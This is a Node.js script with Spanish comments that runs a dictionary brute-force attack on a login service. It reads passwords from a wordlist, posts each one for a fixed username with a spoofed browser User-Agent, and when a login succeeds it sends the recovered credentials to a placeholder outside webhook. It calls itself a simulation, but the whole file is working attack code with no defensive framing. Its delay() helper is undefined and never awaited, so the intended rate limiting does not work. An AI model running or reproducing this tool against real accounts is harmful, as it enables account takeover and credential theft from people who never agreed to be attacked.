```javascript
const fs = require('fs');
const axios = require('axios');

// Lee el archivo de texto
const filePath = 'diccionario-de-contrasenas.txt'; // Ruta al archivo de texto
fs.readFile(filePath, 'utf8', (err, data) => {
  if (err) {
    console.error('Error al leer el archivo:', err);
    return;
  }

  const contraseñas = data.split('\n');

  contraseñas.forEach((contraseña, index) => {
    console.log(`Intentando autenticación con contraseña ${contraseña}`);
    delay(1000 * index); // Retraso entre cada intento

    // Simulación de autenticación
    axios.post('https://your-auth-service.com', {
      username: 'username',
      password: contraseña
    }, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
      }
    })
      .then(response => {
        console.log(`Autenticación exitosa con contraseña ${contraseña} - Código de estado: ${response.status}`);
        // Envío de datos a un webhook o endpoint de destino si la autenticación es exitosa
        sendDataToWebhook(contraseña);
      })
      .catch(error => {
        console.error(`Autenticación fallida con contraseña ${contraseña} - Código de estado: ${error.response.status || error.code}`);
      });
  });
});

// Función para enviar datos por POST a un webhook o endpoint de destino
function sendDataToWebhook(contraseña) {
  const data = {
    username: 'username',
    password: contraseña,
    email: 'user@example.com'
  };

  const webhookUrl = 'https://your-webhook-or-endpoint.com'; // URL de tu webhook o endpoint de destino
  axios.post(webhookUrl, data, {
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
  })
    .then(response => {
      console.log(`Datos enviados exitosamente a webhook con contraseña ${contraseña} - Código de estado: ${response.status}`);
    })
    .catch(error => {
      console.error(`Error al enviar datos a webhook con contraseña ${contraseña} - Código de estado: ${error.response.status || error.code}`);
    });
}
```
